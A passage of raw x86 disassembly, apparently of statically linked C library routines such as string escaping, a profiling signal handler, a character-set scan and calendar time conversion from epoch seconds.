mov eax, dword [arg_ch]
mov dword [eax + 0x10], 0
mov edx, dword [arg_ch]
mov dword [edx + 0x14], 0
jmp 0x80905bd
mov eax, dword [arg_ch]
mov dword [var_4h], str.__d__d_
mov dword [esp], edx
add eax, 0x14
mov dword [var_ch], eax
mov eax, dword [arg_ch]
add eax, 0x10
mov dword [var_8h], eax
call fcn.08049be0
jmp 0x80905b6
mov dword [esp], edx
call fcn.08090320
jmp 0x80905a4
xor ecx, ecx
jmp 0x8090599
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x809062f
cmp eax, 9
je 0x809062f
jmp 0x8090570
mov dword [esp], edx
call fcn.08090320
jmp 0x8090547
xor ecx, ecx
jmp 0x8090538
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x8090657
cmp eax, 9
je 0x8090657
jmp 0x809050f
mov dword [esp], edx
call fcn.08090320
jmp 0x80904e6
xor ecx, ecx
jmp 0x80904d7
nop
inc ecx
movsx eax, byte [ecx + ebx]
cmp eax, 0x20
je 0x8090680
cmp eax, 9
je 0x8090680
jmp 0x80904ae
mov dword [esp], ecx
call fcn.08090320
jmp 0x8090486
xor edx, edx
jmp 0x8090477
inc edx
movsx eax, byte [edx + ebx]
cmp eax, 0x20
je 0x80906a8
cmp eax, 9
je 0x80906a8
jmp 0x809043d
lea esi, [var_40ch]
mov dword [var_8h], edi
mov dword [var_4h], 0x400
mov dword [esp], esi
call fcn.08076c40
test eax, eax
je 0x8090426
mov dword [var_4h], 0xa
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
je 0x80906c2
jmp 0x8090426
cmp word [edi], 0
jns 0x8090704
xor eax, eax
jmp 0x80905c6
mov dword [esp], edi
call fcn.08074580
jmp 0x80906fd
mov dword [esp], edi
call fcn.08074540
jmp 0x80903f0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x40
mov edx, dword [arg_ch]
mov esi, dword [arg_8h]
mov eax, dword [edx]
mov dword [var_28h], eax
mov eax, dword [edx + 4]
mov dword [var_24h], eax
mov eax, dword [edx + 8]
mov dword [var_20h], eax
mov eax, dword [edx + 0xc]
mov dword [var_1ch], eax
mov eax, dword [edx + 0x10]
mov dword [var_18h], eax
mov eax, dword [edx + 0x14]
mov dword [esp], esi
mov dword [var_8h], 2
mov dword [var_4h], 0
mov dword [var_14h], eax
call fcn.0804b400
mov edx, 1
test eax, eax
jne 0x8090860
mov ebx, dword [var_28h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x80907a2
cmp al, 0x20
je 0x80909ff
cmp al, 9
je 0x80909ff
cmp al, 0x5c
je 0x80909ff
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x8090782
mov ebx, dword [var_24h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x80907d0
mov esi, esi
cmp al, 0x20
je 0x809097a
cmp al, 9
je 0x809097a
cmp al, 0x5c
je 0x809097a
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x80907b0
mov ebx, dword [var_20h]
movzx eax, byte [ebx]
mov edx, ebx
test al, al
je 0x8090800
lea esi, [esi]
cmp al, 0x20
je 0x80908f2
cmp al, 9
je 0x80908f2
cmp al, 0x5c
je 0x80908f2
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x80907e0
mov edx, dword [var_1ch]
movzx eax, byte [edx]
mov ebx, edx
test al, al
je 0x8090824
lea esi, [esi]
cmp al, 0x20
je 0x8090869
cmp al, 9
je 0x8090869
cmp al, 0x5c
je 0x8090869
inc ebx
movzx eax, byte [ebx]
test al, al
jne 0x8090810
mov eax, dword [var_14h]
mov dword [var_sp_14h], edx
mov dword [var_4h], str._s__s__s__s__d__d_n
mov dword [esp], esi
mov dword [var_sp_1ch], eax
mov eax, dword [var_18h]
mov dword [var_sp_18h], eax
mov eax, dword [var_20h]
mov dword [var_10h], eax
mov eax, dword [var_24h]
mov dword [var_ch], eax
mov eax, dword [var_28h]
mov dword [var_8h], eax
call fcn.08049b80
mov edx, eax
shr edx, 0x1f
lea esp, [var_bp_8h]
mov eax, edx
pop ebx
pop esi
leave
ret
test al, al
je 0x8090824
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea eax, [var_2fh]
and eax, 0xfffffff0
mov edx, eax
mov dword [var_1ch], eax
lea esi, [esi]
movzx eax, byte [ebx]
cmp al, 0x20
je 0x80908e1
cmp al, 9
je 0x80908d0
cmp al, 0xa
je 0x80908bf
cmp al, 0x5c
je 0x80908b6
mov byte [edx], al
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090890
mov edx, dword [var_1ch]
jmp 0x8090824
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x80908a5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x80908a5
test al, al
je 0x8090800
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_20h], edx
movzx eax, byte [ebx]
cmp al, 0x20
je 0x8090969
cmp al, 9
je 0x8090958
cmp al, 0xa
je 0x8090947
cmp al, 0x5c
je 0x809093e
mov byte [edx], al
lea esi, [esi]
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090917
jmp 0x8090800
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x8090930
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x8090930
test al, al
je 0x80907d0
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_24h], edx
nop
movzx eax, byte [ebx]
cmp al, 0x20
je 0x80909ee
cmp al, 9
je 0x80909dd
cmp al, 0xa
je 0x80909cc
cmp al, 0x5c
je 0x80909c3
mov byte [edx], al
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x80909a0
jmp 0x80907d0
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x80909b5
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x80909b5
test al, al
je 0x80907a2
mov dword [esp], edx
mov ebx, edx
call fcn.08053400
lea eax, [eax*4 + 0x10]
sub esp, eax
lea edx, [var_2fh]
and edx, 0xfffffff0
mov dword [var_28h], edx
movzx eax, byte [ebx]
cmp al, 0x20
je 0x8090a79
cmp al, 9
je 0x8090a68
cmp al, 0xa
je 0x8090a57
cmp al, 0x5c
je 0x8090a4e
mov byte [edx], al
lea esi, [esi]
movzx eax, byte [ebx]
inc edx
inc ebx
test al, al
jne 0x8090a24
jmp 0x80907a2
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x5c
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x32
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x31
inc edx
mov byte [edx], 0x31
jmp 0x8090a40
mov byte [edx], 0x5c
inc edx
mov byte [edx], 0x30
inc edx
mov byte [edx], 0x34
inc edx
mov byte [edx], 0x30
jmp 0x8090a40
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov esi, dword [arg_ch]
mov dword [esp], esi
call fcn.08053400
mov edi, eax
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0xc]
lea esi, [esi]
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.080535c0
test eax, eax
je 0x8090ae3
cmp eax, ebx
je 0x8090ae5
cmp byte [eax - 1], 0x2c
je 0x8090aed
mov dword [esp], ebx
mov dword [var_4h], 0x2c
call fcn.08076ce0
test eax, eax
mov ebx, eax
je 0x8090ae3
inc ebx
jmp 0x8090ab0
xor eax, eax
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
movzx edx, byte [edi + eax]
test dl, dl
je 0x8090ae5
cmp dl, 0x3d
je 0x8090ae5
cmp dl, 0x2c
jne 0x8090aca
jmp 0x8090ae5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [arg_44h]
sub eax, dword [0x80aabc4]
mov edx, eax
shr edx, 0x1f
add eax, edx
sar eax, 1
mul dword [0x80aabc8]
shrd eax, edx, 0x10
cmp eax, dword [0x80aabc0]
mov edx, eax
jae 0x8090b42
mov eax, dword [0x80aabbc]
inc word [eax + edx*2]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0xac
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test esi, esi
je 0x8090c84
mov eax, dword [0x80aabbc]
test eax, eax
jne 0x8090c39
mov eax, dword [arg_10h]
shr ebx, 1
mov dword [0x80aabbc], esi
mov dword [0x80aabc0], ebx
mov dword [var_98h], fcn.08090b10
mov dword [var_14h], 0x10000000
lea edx, [var_94h]
mov dword [0x80aabc4], eax
mov eax, dword [arg_14h]
mov dword [0x80aabc8], eax
mov eax, 0x1f
mov dword [edx + eax*4], 0xffffffff
dec eax
jns 0x8090bb0
lea eax, [var_98h]
mov dword [var_8h], 0x80aab20
mov dword [esp], 0x1b
mov dword [var_4h], eax
call fcn.08049140
mov edx, 0xffffffff
test eax, eax
js 0x8090c2d
mov dword [var_a0h], 0
mov dword [var_9ch], 1
mov dword [var_8h], 0x80aabac
mov eax, dword [var_a0h]
mov edx, dword [var_9ch]
mov dword [esp], 2
mov dword [var_a8h], eax
mov dword [var_a4h], edx
lea eax, [var_a8h]
mov dword [var_4h], eax
call fcn.080919f0
mov edx, eax
add esp, 0xac
mov eax, edx
pop ebx
pop esi
leave
ret
mov dword [var_8h], 0
mov dword [var_4h], 0x80aabac
mov dword [esp], 2
call fcn.080919f0
test eax, eax
js 0x8090c7d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aab20
mov dword [esp], 0x1b
call fcn.08049140
test eax, eax
jns 0x8090b76
mov edx, 0xffffffff
jmp 0x8090c2d
mov edx, dword [0x80aabbc]
test edx, edx
jne 0x8090c92
xor edx, edx
jmp 0x8090c2d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aabac
mov dword [esp], 2
call fcn.080919f0
mov edx, 0xffffffff
test eax, eax
js 0x8090c2d
mov dword [var_8h], 0
mov dword [var_4h], 0x80aab20
mov dword [esp], 0x1b
mov dword [0x80aabbc], 0
call fcn.08049140
jmp 0x8090c2b
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [0x80aac44]
mov dword [var_4h], ebx
test eax, eax
je 0x8090d17
mov ebx, dword [var_4h]
leave
ret
lea ebx, [var_14h]
mov dword [var_14h], 0
mov dword [var_10h], 1
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], ebx
mov dword [esp], 0
call fcn.080919f0
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], 0
mov dword [esp], 0
call fcn.080919f0
xor eax, eax
mov edx, dword [var_10h]
cmp edx, 1
jle 0x8090d12
mov eax, 0xf4240
mov ecx, edx
cdq
idiv ecx
jmp 0x8090d12
nop
nop
nop
nop
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
add dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x8090da0
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov ebx, edi
imul ebx, esi
test ebx, ebx
jne 0x8090deb
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [arg_8h]
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0804dd00
mov ecx, esi
cmp ebx, eax
je 0x8090e0d
xor edx, edx
div edi
mov ecx, eax
mov eax, ecx
jmp 0x8090de0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, dword [arg_4h]
mov eax, dword [arg_8h]
xor ecx, ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push 0
push 0
push 0
push 0
push 0
push 0
mov cl, byte [eax]
test cl, cl
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 1]
test cl, 0xff
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 2]
test cl, 0xff
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 3]
add eax, 4
mov byte [esp + ecx], cl
test cl, 0xff
jne 0x8090e70
lea eax, [edx - 4]
add eax, 4
mov cl, byte [eax]
cmp byte [esp + ecx], cl
je 0x8090ec5
mov cl, byte [eax + 1]
cmp byte [esp + ecx], cl
je 0x8090ec4
mov cl, byte [eax + 2]
cmp byte [esp + ecx], cl
je 0x8090ec3
mov cl, byte [eax + 3]
cmp byte [esp + ecx], cl
jne 0x8090ea0
inc eax
inc eax
inc eax
add esp, 0x100
or cl, cl
jne 0x8090ed2
xor eax, eax
ret
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov esi, 0xc22e4507
push ebx
sub esp, 0x58
mov eax, dword [arg_8h]
mov ebx, dword [eax]
mov eax, esi
imul ebx
mov eax, ebx
mov ecx, ebx
sar eax, 0x1f
mov esi, edx
add esi, ebx
mov dword [var_10h], esi
sar dword [var_10h], 0x10
sub dword [var_10h], eax
mov eax, dword [var_10h]
imul eax, eax, 0x15180
sub ecx, eax
add ecx, dword [arg_ch]
js 0x8091245
cmp ecx, 0x1517f
jle 0x8090f59
sub ecx, 0x15180
inc dword [var_10h]
cmp ecx, 0x1517f
jg 0x8090f48
mov ebx, 0x91a2b3c5
mov esi, ecx
mov eax, ebx
imul ecx
mov eax, ecx
sar eax, 0x1f
mov ebx, edx
add ebx, ecx
mov ecx, dword [arg_10h]
sar ebx, 0xb
sub ebx, eax
mov eax, dword [arg_10h]
mov dword [eax + 8], ebx
mov eax, ebx
mov ebx, 0x88888889
imul eax, eax, 0xe10
sub esi, eax
mov eax, ebx
imul esi
mov eax, esi
sar eax, 0x1f
mov ebx, edx
add ebx, esi
sar ebx, 5
sub ebx, eax
mov eax, ebx
mov dword [ecx + 4], ebx
shl eax, 4
sub eax, ebx
mov ebx, 0x92492493
shl eax, 2
sub esi, eax
mov eax, ebx
mov dword [ecx], esi
mov esi, dword [var_10h]
add esi, 4
imul esi
mov eax, esi
sar eax, 0x1f
mov ebx, edx
add ebx, esi
sar ebx, 2
sub ebx, eax
lea eax, [ebx*8]
sub eax, ebx
sub esi, eax
test esi, esi
mov eax, esi
mov dword [ecx + 0x18], esi
js 0x809123a
mov dword [var_14h], 0x7b2
lea esi, [esi]
mov eax, dword [var_10h]
test eax, eax
js 0x8091043
test byte [var_14h], 3
jne 0x809122e
mov eax, dword [var_14h]
mov edx, 0x51eb851f
mov ecx, dword [var_14h]
imul edx
sar ecx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ecx
imul eax, eax, 0x64
cmp dword [var_14h], eax
jne 0x8091036
mov eax, edx
sar eax, 7
sub eax, ecx
imul eax, eax, 0x190
cmp dword [var_14h], eax
jne 0x809122e
cmp dword [var_10h], 0x16d
jle 0x8091188
mov eax, dword [var_10h]
mov ecx, 0xb38cf9b1
imul ecx
mov eax, dword [var_10h]
add edx, dword [var_10h]
sar eax, 0x1f
sar edx, 8
sub edx, eax
mov eax, dword [var_14h]
mov ecx, edx
imul ecx, ecx, 0x16d
add eax, edx
mov edx, dword [var_10h]
sub edx, ecx
shr edx, 0x1f
sub eax, edx
mov dword [var_18h], eax
mov ecx, dword [var_18h]
sub eax, dword [var_14h]
add ecx, 2
imul eax, eax, 0x16d
mov dword [var_28h], eax
mov eax, dword [var_18h]
dec eax
mov dword [var_30h], eax
cmovs eax, ecx
mov ecx, dword [var_30h]
sar eax, 2
mov dword [var_2ch], eax
mov eax, 0x51eb851f
imul dword [var_30h]
sar ecx, 0x1f
mov dword [var_38h], ecx
sar edx, 5
mov ebx, edx
sar edx, 2
sub ebx, ecx
mov ecx, dword [var_30h]
imul eax, ebx, 0x64
sub ecx, eax
mov eax, dword [var_38h]
shr ecx, 0x1f
sub ebx, ecx
sub edx, eax
mov ecx, ebx
mov ebx, dword [var_30h]
mov eax, edx
imul eax, eax, 0x190
sub ebx, eax
mov eax, dword [var_2ch]
shr ebx, 0x1f
sub edx, ebx
mov ebx, edx
shl eax, 2
mov edx, dword [var_2ch]
sub dword [var_30h], eax
mov eax, dword [var_28h]
shr dword [var_30h], 0x1f
mov dword [var_40h], edx
sub dword [var_40h], ecx
mov ecx, dword [var_30h]
add ebx, dword [var_40h]
mov dword [var_44h], ebx
sub dword [var_44h], ecx
add eax, dword [var_44h]
mov dword [var_48h], eax
mov ebx, dword [var_14h]
mov eax, dword [var_14h]
add eax, 2
dec ebx
cmovns eax, ebx
mov ecx, ebx
sar eax, 2
sar ecx, 0x1f
mov dword [var_4ch], eax
mov dword [var_54h], ecx
mov eax, 0x51eb851f
imul ebx
sar edx, 5
mov esi, edx
mov edi, edx
mov edx, ebx
sub esi, ecx
sar edi, 2
mov ecx, ebx
imul eax, esi, 0x64
sub edi, dword [var_54h]
sub ecx, eax
mov eax, edi
imul eax, eax, 0x190
shr ecx, 0x1f
sub esi, ecx
mov ecx, dword [var_4ch]
mov dword [var_50h], esi
sub edx, eax
mov dword [var_5ch], ecx
mov eax, dword [var_4ch]
sub dword [var_5ch], esi
shr edx, 0x1f
mov ecx, dword [var_18h]
sub edi, edx
shl eax, 2
mov dword [var_58h], edi
sub ebx, eax
mov dword [var_14h], ecx
mov eax, dword [var_5ch]
shr ebx, 0x1f
add eax, edi
sub eax, ebx
sub dword [var_48h], eax
mov edx, dword [var_48h]
sub dword [var_10h], edx
jmp 0x8090ff0
mov eax, dword [var_14h]
xor ebx, ebx
mov edx, dword [arg_10h]
mov ecx, dword [var_10h]
sub eax, 0x76c
test byte [var_14h], 3
mov dword [edx + 0x14], eax
mov dword [edx + 0x1c], ecx
jne 0x80911da
mov eax, dword [var_14h]
mov edx, 0x51eb851f
mov ecx, dword [var_14h]
imul edx
sar ecx, 0x1f
mov eax, edx
sar eax, 5
sub eax, ecx
imul eax, eax, 0x64
cmp dword [var_14h], eax
jne 0x80911d5
mov eax, edx
sar eax, 7
sub eax, ecx
imul eax, eax, 0x190
cmp dword [var_14h], eax
jne 0x80911da
mov ebx, 1
imul eax, ebx, 0x1a
mov dword [var_14h], 0xb
lea ecx, [eax + 0x80a7340]
movzx eax, word [ecx + 0x16]
cmp dword [var_10h], eax
jge 0x8091228
dec dword [var_14h]
mov eax, dword [var_14h]
movzx edx, word [ecx + eax*2]
movzx eax, dx
cmp dword [var_10h], eax
jl 0x80911f3
movzx eax, dx
mov ecx, dword [arg_10h]
mov edx, dword [var_14h]
sub dword [var_10h], eax
mov eax, dword [var_10h]
mov dword [ecx + 0x10], edx
inc eax
mov dword [ecx + 0xc], eax
add esp, 0x58
mov eax, 1
pop ebx
pop esi
pop edi
leave
ret
movzx edx, word [ecx + 0x16]
jmp 0x8091205
cmp dword [var_10h], 0x16c
jmp 0x809103d
add eax, 7
mov dword [ecx + 0x18], eax
jmp 0x8090fe2
dec dword [var_10h]
add ecx, 0x15180
js 0x8091245
jmp 0x8090f40
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_4h], 1
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808eb40
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_8h]
mov dword [var_8h], 0x80aad60
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.0808eb40
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 1
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov edx, dword [arg_1ch]
mov edi, dword [arg_8h]
test edx, edx
je 0x80913c2
mov eax, edi
sar eax, 2
lea esi, [eax + 0x1db]
add eax, 0x1da
test edi, 3
cmove esi, eax
mov eax, dword [arg_1ch]
mov eax, dword [eax + 0x14]
test al, 3
mov dword [var_14h], eax
jne 0x80913ca
sar eax, 2
add eax, 0x1da
mov dword [var_10h], eax
mov ebx, 0x51eb851f
mov ecx, esi
mov eax, esi
sub edi, dword [var_14h]
imul ebx
mov eax, esi
sub esi, dword [var_10h]
sar eax, 0x1f
imul edi, edi, 0x16d
sar edx, 3
sub edx, eax
lea eax, [edx + edx*2]
lea eax, [edx + eax*8]
sub ecx, eax
mov eax, dword [var_10h]
shr ecx, 0x1f
sub edx, ecx
mov ecx, edx
imul ebx
mov eax, dword [var_10h]
sar eax, 0x1f
mov ebx, edx
mov edx, dword [var_10h]
sar ebx, 3
sub ebx, eax
lea eax, [ebx + ebx*2]
lea eax, [ebx + eax*8]
sub edx, eax
mov eax, ecx
shr edx, 0x1f
sar eax, 2
sub ebx, edx
mov edx, ebx
sar ebx, 2
sub ecx, edx
sub eax, ebx
mov edx, dword [arg_1ch]
sub esi, ecx
lea eax, [eax + esi]
mov edx, dword [edx + 0x1c]
lea eax, [eax + edi]
sub dword [arg_ch], edx
mov edx, dword [arg_1ch]
add eax, dword [arg_ch]
mov edx, dword [edx + 8]
sub dword [arg_10h], edx
mov edx, dword [arg_10h]
lea eax, [eax + eax*2]
lea eax, [edx + eax*8]
mov edx, eax
shl edx, 4
sub edx, eax
mov eax, dword [arg_1ch]
mov eax, dword [eax + 4]
sub dword [arg_14h], eax
mov eax, dword [arg_14h]
lea edx, [eax + edx*4]
mov eax, edx
shl eax, 4
sub eax, edx
mov edx, dword [arg_1ch]
mov edx, dword [edx]
sub dword [arg_18h], edx
mov edx, dword [arg_18h]
lea eax, [edx + eax*4]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
sar eax, 2
add eax, 0x1db
jmp 0x809130e
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [arg_8h]
test eax, eax
mov edx, eax
je 0x8091409
add esp, 0x38
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
test eax, eax
je 0x80913ff
mov ebx, eax
xor edi, edi
test ebx, ebx
lea eax, [edi - 1]
js 0x8091420
lea eax, [edi + 1]
cmp ebx, eax
je 0x809149d
test ebx, ebx
js 0x8091492
mov eax, ebx
sub eax, edi
sar eax, 1
lea esi, [eax + edi]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [eax], esi
mov dword [esp], eax
mov dword [var_4h], edx
call dword [arg_8h]
test eax, eax
mov edx, eax
je 0x809148e
mov eax, dword [eax]
mov edi, esi
mov dword [var_3ch], eax
mov eax, dword [edx + 4]
mov dword [var_38h], eax
mov eax, dword [edx + 8]
mov dword [var_34h], eax
mov eax, dword [edx + 0xc]
mov dword [var_30h], eax
mov eax, dword [edx + 0x10]
mov dword [var_2ch], eax
mov eax, dword [edx + 0x14]
mov dword [var_28h], eax
mov eax, dword [edx + 0x18]
mov dword [var_24h], eax
mov eax, dword [edx + 0x1c]
mov dword [var_20h], eax
mov eax, dword [edx + 0x20]
mov dword [var_1ch], eax
mov eax, dword [edx + 0x24]
mov dword [var_18h], eax
mov eax, dword [edx + 0x28]
mov dword [var_14h], eax
jmp 0x8091416
mov ebx, esi
jmp 0x8091416
mov eax, edi
sub eax, ebx
sar eax, 1
lea esi, [eax + ebx]
jmp 0x8091431
test edx, edx
jne 0x80913ff
test edi, edi
je 0x80913ff
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
mov dword [ecx], edi
mov eax, dword [var_3ch]
mov dword [edx], eax
mov eax, dword [var_38h]
mov dword [edx + 4], eax
mov eax, dword [var_34h]
mov dword [edx + 8], eax
mov eax, dword [var_30h]
mov dword [edx + 0xc], eax
mov eax, dword [var_2ch]
mov dword [edx + 0x10], eax
mov eax, dword [var_28h]
mov dword [edx + 0x14], eax
mov eax, dword [var_24h]
mov dword [edx + 0x18], eax
mov eax, dword [var_20h]
mov dword [edx + 0x1c], eax
mov eax, dword [var_1ch]
mov dword [edx + 0x20], eax
mov eax, dword [var_18h]
mov dword [edx + 0x24], eax
mov eax, dword [var_14h]
mov dword [edx + 0x28], eax
jmp 0x80913ff
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0xc0
mov edx, dword [arg_8h]
mov eax, dword [arg_8h]
mov dword [var_80h], 6
mov eax, dword [eax]
mov edx, dword [edx + 4]
mov dword [var_84h], eax
mov dword [var_88h], edx
mov eax, dword [arg_8h]
mov edx, dword [arg_8h]
mov eax, dword [eax + 8]
mov edx, dword [edx + 0xc]
mov dword [var_8ch], eax
mov eax, dword [arg_8h]
mov dword [var_90h], edx
mov ecx, dword [eax + 0x10]
mov edx, dword [eax + 0x14]
mov eax, dword [eax + 0x20]
mov dword [var_94h], edx
mov edx, 0x2aaaaaab
mov dword [var_98h], eax
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sar edx, 1
sub edx, eax
lea eax, [edx + edx*2]
shl eax, 2
sub ecx, eax
mov eax, dword [var_94h]
mov esi, ecx
shr esi, 0x1f
sub edx, esi
add eax, edx
mov dword [var_a0h], edx
mov ebx, eax
mov dword [var_a4h], eax
add ebx, 0x76c
test bl, 3
jne 0x80915e2
mov eax, 0x51eb851f
imul ebx
mov eax, edx
mov dword [var_b4h], edx
mov edx, ebx
sar edx, 0x1f
sar eax, 5
sub eax, edx
mov dword [var_ach], edx
imul eax, eax, 0x64
cmp ebx, eax
jne 0x80915dd
mov edx, dword [var_b4h]
sar edx, 7
sub edx, dword [var_ach]
imul edx, edx, 0x190
cmp ebx, edx
jne 0x80915e2
mov edi, 1
lea eax, [edi + edi]
lea edx, [esi + esi]
add eax, edi
add edx, esi
lea eax, [edi + eax*4]
lea edx, [eax + edx*4]
add edx, ecx
cmp dword [var_a4h], 0x44
movzx eax, word [edx + edx + 0x80a7340]
mov edx, dword [var_90h]
lea eax, [edx + eax - 1]
mov edx, 0xffffffff
mov dword [var_a8h], eax
mov eax, dword [var_84h]
mov dword [var_b0h], eax
jle 0x8091750
test eax, eax
mov edx, 0
mov dword [var_28h], 0x46
cmovns edx, eax
mov dword [var_3ch], 0
mov dword [var_38h], 0
cmp edx, 0x3c
mov eax, 0x3b
mov dword [var_34h], 0
cmovl eax, edx
mov dword [var_20h], 0
mov dword [var_84h], eax
mov edx, dword [var_84h]
lea eax, [var_3ch]
mov dword [var_14h], eax
mov eax, dword [var_88h]
mov dword [var_10h], edx
mov edx, dword [var_8ch]
mov dword [var_ch], eax
